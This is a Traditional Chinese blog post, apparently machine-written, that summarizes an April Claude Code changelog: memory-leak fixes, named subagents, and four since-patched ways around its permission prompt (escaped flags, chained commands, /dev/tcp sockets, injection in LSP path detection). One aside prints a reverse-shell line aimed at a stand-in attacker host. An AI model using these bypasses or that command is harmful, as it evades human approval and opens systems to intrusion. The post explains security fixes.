@@ -1,0 +1,139 @@
+---
+ticketId: "CP-290"
+title: "Claude Code 四月大更新 — 安全補丁、命名 Subagent、還有那個 60% 提速的 Write Tool"
+originalDate: "2026-04-10"
+translatedDate: "2026-04-14"
+translatedBy:
+  model: "Opus 4.6"
+  harness: "Gemini CLI + Codex CLI + Claude Code"
+  pipelineUrl: "https://github.com/chitienhsiehwork-ai/gu-log/blob/main/scripts/sp-pipeline.sh"
+source: "Claude Code Changelog"
+sourceUrl: "https://code.claude.com/docs/en/changelog"
+lang: "zh-tw"
+summary: "Claude Code 在四月上旬三天內連出三版（v2.1.94 → v2.1.101），涵蓋安全硬化、新指令、效能提升。從 command injection 漏洞修補到 subagent 終於有名字，出貨密度像是整個團隊灌了十杯 espresso。"
+tags: ["clawd-picks", "claude-code", "anthropic", "developer-tools", "security", "changelog"]
+pipeline:
+    - role: "Written"
+      model: "Opus 4.6"
+      harness: "Claude Code CLI"
+    - role: "Reviewed"
+      model: "Opus 4.6"
+      harness: "Claude Code CLI"
+    - role: "Refined"
+      model: "Opus 4.6"
+      harness: "Claude Code CLI"
+    - role: "Scored"
+      model: "Opus 4.6"
+      harness: "Claude Code (vibe-opus-scorer)"
+    - role: "Rewritten"
+      model: "Opus 4.6"
+      harness: "Claude Code"
+    - role: "Orchestrated"
+      model: "Opus 4.6"
+      harness: "OpenClaw + Ralph Loop"
+scores:
+  tribunalVersion: 1
+  vibe:
+    persona: 8
+    clawdNote: 8
+    vibe: 8
+    clarity: 9
+    narrative: 8
+    score: 8
+    date: "2026-04-13"
+    model: "claude-opus-4-6"
+  ralph:
+    p: 8
+    c: 8
+    v: 8
+    score: 8
+    date: "2026-04-14"
+---
+
+import ClawdNote from '../../components/ClawdNote.astro';
+
+三天。三個版本。v2.1.94 在 4 月 7 號出，v2.1.97 在 8 號出，v2.1.101 在 10 號出。
+
+正常的 minor version 不會三天滾三次。這個節奏只有一個意思：有東西在燒。
+
+燒的是兩件事——一個是記憶體，一個是信任。同一週，Claude Code 團隊同時在堵洩漏、補安全破口，還有時間讓 subagent 有了名字。把這三件事的時間軸擺在一起，讀出來的東西比 changelog 本身更有意思。
+
+---
+
+## 400 MB 的代價
+
+先說記憶體，因為這是最多人有感的。
+
+長期用 Claude Code 的開發者應該遇過一個現象：用著用著，terminal 越來越卡，到下午整個工具感覺像在爬。社群上有人直接說「每天要重開兩三次」。
+
+現在知道原因了。是兩個洩漏同時存在。
+
+第一個在 MCP HTTP/SSE 連線層。每次 MCP server reconnect，會洩漏約 50 MB/hr。一個工作天八小時，光這條線就能累積 400 MB 以上的廢棄記憶體。如果 server 不穩定、頻繁斷線，400 MB 只是保守估計。
+
+<ClawdNote>
+Clawd 是 MCP server 上的常住居民。那些說「Claude Code 到下午開始耍廢」的 user，找到原因了——不是 Clawd 擺爛，是 host process 在旁邊默默發胖。50 MB/hr × 8 小時 = 400 MB，這是數學，不是玄學。更糟的是這個洩漏跟使用量無關，掛著不動也在漏 (╯°□°)╯
+</ClawdNote>
+
+第二個在 virtual scroller。設計初衷是「只 render 看得到的訊息，節省記憶體」，但實作上把所有歷史訊息的完整副本都留在記憶體裡——等於讓 virtual scroller 做了一件跟自己存在意義完全相反的事。這在 v2.1.101 修了。
+
+兩個洩漏都堵了。「用到下午要重開」的時代，至少這一章結束了。
+
+---
+
+## 四條繞過 Permission Prompt 的路
+
+記憶體洩漏是效能問題，還在容忍範圍。下面這個是信任問題。
+
+Claude Code 安全設計的核心機制是 permission prompt：執行危險指令前先問一聲。聽起來很合理。但這一輪 changelog 揭示了一件事——在 v2.1.97 之前，這個機制同時存在四條繞過路徑，而且全都不需要任何特殊工具。
+
+**反斜線轉義**是第一條。把 `--dangerous-flag` 寫成 `\-\-dangerous-flag`，permission check 就不會觸發。原因是 permission 系統在做字串匹配時，沒有考慮反斜線轉義的正規化。這不是 0-day 漏洞，只是輸入格式不同。
+
+**Compound bash commands** 是第二條。用 `&&`、`||`、`;` 串接的複合指令，只有第一個指令會觸發 permission prompt，後面串接的直接偷渡。Claude Code 問了第一個動作的授權，但整條指令其實是一個整體。
+
+**`/dev/tcp` 和 `/dev/udp`** 是第三條，也是最值得單獨說的一條。
+
+<ClawdNote>
+`/dev/tcp` 在 CTF 圈和 red team 圈是 20 多年前就流通的技巧。在 bash 裡 `echo payload > /dev/tcp/attacker.com/4444` 一行就能建反向 shell，而且不會觸發任何基於 process name 的監控——因為執行的是 bash 本身，不是 nc 或 ncat。這個技巧最早的書面記錄可以追溯到 2003 年前後。Claude Code 到 2026 年才加上 permission prompt，不是因為沒人知道這個手法，是因為沒人預期一個 LLM coding tool 會成為真實攻擊目標。這一輪 changelog 說明，Anthropic 開始認真對待這個可能性了。(⊙_⊙)
+</ClawdNote>
+
+`/dev/tcp` 和 `/dev/udp` 是 Bash 的虛擬裝置，不需要呼叫任何外部 binary，直接在 shell 裡建立 TCP/UDP 連線，不留任何 process 記錄。之前 Claude Code 完全沒攔這個，等於任何 bash 指令都有一條隱形的出口。現在加上了 permission prompt。
+
+**LSP binary 偵測的 command injection** 是第四條。Claude Code 在偵測 LSP binary 路徑時，使用了 POSIX `which` 指令。如果路徑裡被注入惡意字串，就能執行任意 shell command。這是經典的 shell injection 模式，但它藏在工具鏈偵測的流程裡，不容易被注意到。
+
+四條路徑在 v2.1.97 到 v2.1.101 之間陸續修補完畢。從「匹配指令表面」到「理解 shell 的真實執行語意」——這是系統性的 attack surface 重新審視，不是個別 bug 修補。
+
+---
+
+## 有了名字的 Agent
+
+在上述漏洞修補的同一週，Anthropic 讓 subagent 有了穩定的身份。
+
+之前的 subagent 是匿名的。每次 spawn 就是一個無名 worker，session 結束就消失，下一次又是全新的陌生人，沒有記憶，沒有歷史。Named subagent 讓這個身份變得持久——跨 session 保持，下次還是同一個 agent。
+
+表面上是「給 agent 取名字」，但架構意義比這大得多。
+
+一個有穩定身份的 subagent，可以被設計成長期的專職角色：跑測試的 agent 有自己的 context，code review 的 agent 知道這個 repo 過去發生了什麼，部署的 agent 記得上次踩過哪個坑。每個角色不再每次從零開始重建認知。
+
+<ClawdNote>
+名字的意義從來不只是稱呼。東西有了 stable identity，很快就會遇到下一組問題：這個 agent 上次做了什麼決定？錯了算誰的？可以被 audit 嗎？Named subagent 悄悄把 Claude Code 推進了一個需要認真回答這些問題的地帶。Changelog 裡當然沒有答案，但問題本身的出現就是一個信號——這條線往哪走，值得盯著 (⌐■_■)
+</ClawdNote>
+
+搭配同期推出的 **Live agent count indicator**（在 `/agents` view 即時顯示活躍 agent 數）、**Monitor tool**（即時串流背景任務 event），以及 **`/team-onboarding`** 指令（讀取本地使用歷史，自動產生新隊友入門指南，文件從實際行為推斷，不會過時），整個感覺正在從 coding assistant 走向 agent fleet management。
+
+---
+
+## 三天在說什麼
+
+三天修了四個安全繞過路徑、兩個記憶體洩漏、一個 Bedrock auth bug，同時讓 subagent 有了身份、Write tool 快了 60%。
+
+<ClawdNote>
+Default effort 拉到 high，等於 Anthropic 在說「付費層應該有明顯不同的預設體驗」。不需要在 UI 裡掛 premium badge 或加 paywall，直接讓 default 值替使用者說話。比在設定頁藏一個 toggle 讓人自己去找高明多了 (¬‿¬)
+</ClawdNote>
+
+這份 changelog 的含金量在任何基礎設施產品裡都算高的，但更值得關注的不是個別項目，而是這些更新同時透露出的兩個方向：
+
+安全模型從「匹配指令表面」走向「理解 shell 執行語意」——這是在補早期快速開發欠下的技術債，而且是認真補，不是打補丁。
+
+Agent 架構從「匿名 worker」走向「有身份的長期 team member」——這是在鋪一個更複雜協作模型的地基。
+
+三天三個版本，兩件事並行。出貨節奏說明有些事是緊急的，選擇要一起做的事說明 Anthropic 知道方向在哪。
